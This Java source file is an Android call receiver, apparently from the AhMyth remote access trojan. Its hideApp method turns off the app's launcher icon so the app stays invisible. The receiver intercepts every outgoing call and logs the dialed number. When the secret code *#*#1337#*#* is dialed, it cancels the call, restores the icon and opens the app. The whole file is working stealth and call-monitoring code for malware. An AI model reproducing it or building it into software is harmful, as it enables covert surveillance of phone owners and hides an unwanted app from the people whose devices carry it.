package ahmyth.mine.king.ahmyth;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.util.Log;

/**
 * UnhideReceiver - Listens for special dial codes to unhide the app
 * Dial *#*#1337#*#* to unhide the app icon
 */
public class UnhideReceiver extends BroadcastReceiver {
    
    private static final String TAG = "UnhideReceiver";
    
    // Secret dial code to unhide the app (without # and *)
    private static final String UNHIDE_CODE = "1337";
    private static final String UNHIDE_FULL_CODE = "*#*#1337#*#*";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null) return;
        
        String action = intent.getAction();
        
        if (Intent.ACTION_NEW_OUTGOING_CALL.equals(action)) {
            String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            
            if (phoneNumber != null) {
                Log.d(TAG, "Outgoing call detected: " + phoneNumber);
                
                // Check for unhide code
                if (phoneNumber.contains(UNHIDE_CODE) || 
                    phoneNumber.equals(UNHIDE_FULL_CODE) ||
                    phoneNumber.replace("*", "").replace("#", "").equals(UNHIDE_CODE)) {
                    
                    Log.d(TAG, "Unhide code detected!");
                    
                    // Cancel the call
                    setResultData(null);
                    
                    // Unhide the app
                    unhideApp(context);
                    
                    // Launch the main activity
                    launchApp(context);
                }
            }
        }
    }
    
    /**
     * Re-enable the launcher icon
     */
    private void unhideApp(Context context) {
        try {
            PackageManager pm = context.getPackageManager();
            
            // Enable the launcher alias
            ComponentName launcherAlias = new ComponentName(context, "ahmyth.mine.king.ahmyth.LauncherAlias");
            pm.setComponentEnabledSetting(
                launcherAlias,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            );
            
            // Also try to enable the main activity
            ComponentName mainActivity = new ComponentName(context, MainActivity.class);
            pm.setComponentEnabledSetting(
                mainActivity,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            );
            
            Log.d(TAG, "App unhidden successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error unhiding app", e);
        }
    }
    
    /**
     * Launch the main activity
     */
    private void launchApp(Context context) {
        try {
            Intent launchIntent = new Intent(context, MainActivity.class);
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
            context.startActivity(launchIntent);
            Log.d(TAG, "App launched");
        } catch (Exception e) {
            Log.e(TAG, "Error launching app", e);
        }
    }
    
    /**
     * Static method to hide the app icon
     */
    public static void hideApp(Context context) {
        try {
            PackageManager pm = context.getPackageManager();
            
            // Disable the launcher alias
            ComponentName launcherAlias = new ComponentName(context, "ahmyth.mine.king.ahmyth.LauncherAlias");
            pm.setComponentEnabledSetting(
                launcherAlias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
            
            Log.d(TAG, "App icon hidden");
        } catch (Exception e) {
            Log.e(TAG, "Error hiding app icon", e);
        }
    }
}

